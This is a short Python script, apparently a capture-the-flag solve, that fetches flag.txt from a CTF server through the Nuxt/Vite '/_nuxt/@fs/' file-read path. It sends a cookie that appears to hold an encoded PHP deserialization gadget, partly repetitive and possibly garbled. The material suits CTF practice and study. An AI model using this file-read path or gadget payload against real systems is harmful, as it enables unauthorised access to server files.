import requests

url = "http://ctf.tcp1p.com:45681/_nuxt/@fs/flag.txt"

headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "http://ctf.tcp1p.com:45681/_nuxt/@fs/app/packages/nuxt/src/app/index.ts",
    "Cookie": "session=819c53d2-f7d5-4480-8537-63a0c2d4dc2f.s4J6rdZ365HND1NNwMeThFLPAtk; cookie=TzoxNzoiR2FkZ2V0VHdvXEVjaG9lcnMiOjE6e3M6NToia2xhc3MiO086MT6ImeThLzfX2EzEiYxxE3fSzjcETozRx5Ej2dcT6M3MeM3eYDMYjzMpZYVzZiNxcxw7TeFzzIjmIj0zM7kR1aIg5W4MYj9TYzIkW4THG4MYj95mNzYzNjZzMTYzA2MzIx9wMzIjz7vZzIzYzZxwTzIjA2MzMy9jMzIjI1NzV7w7wjwRx5Ej2dcT6M3MeM3eYDMYjz3Ex8zMeM3cxz3EzEjYEjycETGzTeXzEzcGMzTgxIjtx2T3ME3eYxwMzR1YzExdDcmZxF0IjXHEjZDDcmZxF0Ijc6MzYzZjJzMTYzA2MzIx9wMzIjz7vZzIzYzZxwTzIjA2MzMy9jMzIjI1NzV7w7wjwRx5Ej2dcT6M3MeM3eYDMYjz3Ex8zMeM3cxz3EzEjYEjycETGzTeXzEzcGMzTgx",
    "If-None-Match": 'W/"6ba-EqxIR+PicE0KT6KPC3vYgsWgR58"'
}

response = requests.get(url, headers=headers)

print(response.text)
